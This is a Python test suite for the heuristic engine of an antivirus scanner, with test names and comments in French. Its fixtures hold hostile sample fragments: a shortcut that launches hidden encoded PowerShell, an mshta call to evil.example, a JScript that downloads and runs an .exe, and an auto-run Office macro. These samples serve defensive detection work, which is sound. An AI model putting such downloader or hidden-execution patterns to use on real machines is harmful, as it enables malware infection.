"""Pieges courants reperes sans signature (toujours "suspects", jamais mis en quarantaine)."""

import io
import zipfile

from freeav import heuristics
from freeav.scanner import Scanner
from freeav.signatures import SignatureDB


def lnk(target: str) -> bytes:
    return b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 68 + target.encode("utf-16-le")


def ooxml(vba: bytes | None) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("word/document.xml", "<w:document/>")
        if vba is not None:
            z.writestr("word/vbaProject.bin", vba)
    return buf.getvalue()


def test_double_extension_hiding_a_program(tmp_path):
    for name in ("facture.pdf.exe", "Photo.JPG.scr", "contrat.docx.lnk"):
        assert heuristics.check(tmp_path / name) is not None, name
    for name in ("setup.exe", "archive.tar.gz", "version.1.2.exe", "notes.txt"):
        assert heuristics.check(tmp_path / name) is None, name
    assert heuristics.check(tmp_path / ("facture.pdf" + " " * 20 + ".exe")) is not None


def test_booby_trapped_shortcut(tmp_path):
    bad = tmp_path / "Facture.lnk"
    bad.write_bytes(lnk(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "
                        "-w hidden -enc SQBFAFgA"))
    assert heuristics.check(bad) == "Heuristique.RaccourciPiege"
    mshta = tmp_path / "Lire.lnk"
    mshta.write_bytes(lnk(r"C:\Windows\System32\mshta.exe https://evil.example/a.hta"))
    assert heuristics.check(mshta) == "Heuristique.RaccourciPiege"
    good = tmp_path / "PowerShell.lnk"  # raccourci normal du menu Demarrer
    good.write_bytes(lnk(r"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"))
    assert heuristics.check(good) is None


def test_downloaded_script_that_fetches_and_runs(tmp_path):
    js = tmp_path / "commande.js"
    js.write_text('var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","http://e.x/a.exe");'
                  'new ActiveXObject("WScript.Shell").Run("a.exe");')
    assert heuristics.check(js, internet=True) == "Heuristique.ScriptTelechargeur"
    assert heuristics.check(js, internet=False) is None  # cree sur le PC : jamais signale
    calm = tmp_path / "menu.js"
    calm.write_text('document.getElementById("menu").classList.toggle("ouvert");')
    assert heuristics.check(calm, internet=True) is None


def test_downloaded_office_document_with_auto_macro(tmp_path):
    doc = tmp_path / "facture.docm"
    doc.write_bytes(ooxml(b"\xcc\x61Attribute VB_Name\x00Document_Open\x00Shell"))
    assert heuristics.check(doc, internet=True) == "Heuristique.MacroAutomatique"
    assert heuristics.check(doc, internet=False) is None
    plain = tmp_path / "rapport.docm"
    plain.write_bytes(ooxml(b"Sub Calcul()\x00End Sub"))  # macro sans lancement automatique
    assert heuristics.check(plain, internet=True) is None
    nomacro = tmp_path / "lettre.doc"
    nomacro.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 100 + b"Document_Open")
    assert heuristics.check(nomacro, internet=True) is None  # pas de projet VBA


def test_heuristic_findings_are_suspects_never_threats(tmp_path):
    (tmp_path / "facture.pdf.exe").write_bytes(b"MZ")
    (tmp_path / "sain.txt").write_text("bonjour")
    report = Scanner(SignatureDB()).scan([tmp_path])
    assert [d.engine for d in report.detections] == ["heuristique"]
    assert report.threats == [] and len(report.suspects) == 1
    assert Scanner(SignatureDB(), heuristics=False).scan([tmp_path]).detections == []


def test_downloaded_web_library_is_not_flagged(tmp_path):
    lib = tmp_path / "jquery.min.js"
    lib.write_text('/*! https://jquery.com */ (function(){ queue.run("x"); fetch("https://api.x/");'
                   ' var iex = 1; })();')
    assert heuristics.check(lib, internet=True) is None


import os
import pytest


@pytest.mark.skipif(os.name != "nt", reason="marque Internet de Windows (flux NTFS)")
def test_mark_of_the_web_is_read_on_windows(tmp_path):
    f = tmp_path / "telecharge.vbs"
    f.write_text('CreateObject("WScript.Shell").Run "x"')
    assert not heuristics.from_internet(f)
    with open(f"{f}:Zone.Identifier", "w") as ads:
        ads.write("[ZoneTransfer]\nZoneId=3\nHostUrl=https://example.com/\n")
    assert heuristics.from_internet(f)
